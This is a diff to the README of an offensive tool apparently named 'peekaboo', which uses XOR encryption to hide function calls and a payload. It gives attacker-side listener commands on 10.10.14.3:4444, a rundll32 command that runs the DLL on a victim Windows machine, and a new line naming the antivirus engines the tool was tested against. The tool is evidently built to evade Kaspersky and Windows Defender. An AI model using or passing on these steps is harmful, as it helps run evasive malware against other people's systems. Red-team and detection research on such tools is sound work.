@@ -11,7 +11,7 @@ XOR encryption and decryption for functions call and main payload - `calc.exe` a
 ### on attacker machine
 run python script with flags:
 ```bash
-python2.7 peekaboo.py -l 10.10.14.3 -p 4444
+python3 peekaboo.py -l 10.10.14.3 -p 4444
 ```
 
 ### then on victim machine (windows x64):
@@ -24,7 +24,7 @@ rundll32 .\peekaboo.dll, TpLbDJOWUjUmGyuHWpKk
 ### on attacker machine:
 run python script on linux:
 ```bash
-python2.7 peekaboo-inj.py -l 10.10.14.3 -p 4444
+python3 peekaboo-inj.py -l 10.10.14.3 -p 4444
 ```
 
 compile in VS - windows machine x64:
@@ -39,9 +39,10 @@ compile in VS - windows machine x64:
 
 ## Issues.
 Tested on:
-1. Kali linux 2020.1, Windows 10 x64 - attacker machines
-2. Windows 10 x64 - victim machine
-3. Calc.exe - payload
+1. Attacker machines: Kali linux 2020.1, Windows 10 x64
+2. Victim machine: Windows 10 x64
+3. Payload: Calc.exe
+4. AV Engines: Kaspersky, Windows Defender
 
 ## TODO
 Compile injector in Kali linux
